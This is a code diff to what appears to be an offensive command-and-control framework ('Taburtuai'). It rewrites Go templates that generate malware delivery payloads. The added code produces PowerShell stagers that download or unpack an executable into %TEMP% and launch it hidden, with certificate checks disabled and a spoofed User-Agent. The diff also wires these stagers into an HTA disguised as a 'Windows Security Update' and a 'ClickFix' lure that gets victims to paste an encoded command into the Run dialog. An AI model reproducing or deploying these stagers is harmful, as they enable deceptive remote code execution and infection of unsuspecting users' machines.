@@ -13,34 +13,51 @@ import (
 
 // ── delivery format generators ────────────────────────────────────────────────
 
-// templatePS1Drop generates a PowerShell stager that downloads the stager EXE
-// from a URL, drops it to %TEMP%, and executes it silently.
-func templatePS1Drop(stageURL string, stagerEXE []byte) string {
+// templatePS1Drop generates a PowerShell stager that downloads the staged
+// payload directly from stageURL, drops it to %TEMP%, and executes it.
+// No binary is embedded — the stage server decrypts and serves plaintext bytes.
+func templatePS1Drop(stageURL string) string {
+	return fmt.Sprintf(`$ErrorActionPreference = 'SilentlyContinue'
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+$wc = New-Object Net.WebClient
+$wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+$p = [IO.Path]::Combine($env:TEMP, [IO.Path]::GetRandomFileName() + '.exe')
+try { $wc.DownloadFile('%s', $p) } catch { exit }
+if (-not (Test-Path $p) -or (Get-Item $p).Length -eq 0) { exit }
+$s = New-Object Diagnostics.ProcessStartInfo
+$s.FileName = $p
+$s.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
+$s.CreateNoWindow = $true
+[Diagnostics.Process]::Start($s) | Out-Null
+`, stageURL)
+}
+
+// templatePS1Embed drops a pre-compiled EXE (embedded as base64) to %TEMP%
+// and executes it. Uses a here-string to avoid PowerShell parser stack overflows
+// that occur with thousands of concatenated string literals.
+func templatePS1Embed(stagerEXE []byte) string {
 	b64 := base64.StdEncoding.EncodeToString(stagerEXE)
-	// Split base64 into 76-char lines to avoid PS1 line length issues
-	var lines []string
+	// Split into 76-char lines — here-string, NOT concatenation, so no SOE
+	var sb strings.Builder
 	for i := 0; i < len(b64); i += 76 {
 		end := i + 76
 		if end > len(b64) {
 			end = len(b64)
 		}
-		lines = append(lines, `"`+b64[i:end]+`"`)
+		sb.WriteString(b64[i:end])
+		sb.WriteByte('\n')
 	}
-	b64Parts := strings.Join(lines, "+\n  ")
-
-	return fmt.Sprintf(`# Taburtuai Stager — PS1 drop-and-execute
-$ErrorActionPreference = 'SilentlyContinue'
-$p = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetRandomFileName() + '.exe')
-$b = [System.Convert]::FromBase64String(
-  %s
-)
-[System.IO.File]::WriteAllBytes($p, $b)
-$s = New-Object System.Diagnostics.ProcessStartInfo
+	return fmt.Sprintf(`$ErrorActionPreference = 'SilentlyContinue'
+$p = [IO.Path]::Combine($env:TEMP, [IO.Path]::GetRandomFileName() + '.exe')
+$b64 = @"
+%s"@
+[IO.File]::WriteAllBytes($p, [Convert]::FromBase64String($b64 -replace '\s',''))
+$s = New-Object Diagnostics.ProcessStartInfo
 $s.FileName = $p
-$s.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$s.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
 $s.CreateNoWindow = $true
-[System.Diagnostics.Process]::Start($s) | Out-Null
-`, b64Parts)
+[Diagnostics.Process]::Start($s) | Out-Null
+`, sb.String())
 }
 
 // templatePS1Shellcode generates a PowerShell stager that downloads raw shellcode
@@ -69,7 +86,12 @@ $k32::WaitForSingleObject($h, -1) | Out-Null
 
 // templateHTA generates an HTML Application (.hta) that runs the PS1 stager.
 func templateHTA(stageURL string, stagerEXE []byte) string {
-	ps1 := templatePS1Drop(stageURL, stagerEXE)
+	var ps1 string
+	if stageURL != "" {
+		ps1 = templatePS1Drop(stageURL)
+	} else {
+		ps1 = templatePS1Embed(stagerEXE)
+	}
 	ps1B64 := base64.StdEncoding.EncodeToString([]byte(ps1))
 	return fmt.Sprintf(`<html>
 <head><title>Windows Security Update</title></head>
@@ -181,7 +203,7 @@ class Program {
 //   2. Paste the command
 //   3. Press Enter
 func templateClickFix(stagerEXE []byte, lure string) string {
-	ps1 := templatePS1Drop("", stagerEXE)
+	ps1 := templatePS1Embed(stagerEXE)
 	// Encode to avoid quote issues in the Run dialog
 	ps1B64 := base64.StdEncoding.EncodeToString([]byte(ps1))
 	runCmd := fmt.Sprintf(`powershell -w hidden -ep bypass -enc %s`, ps1B64)
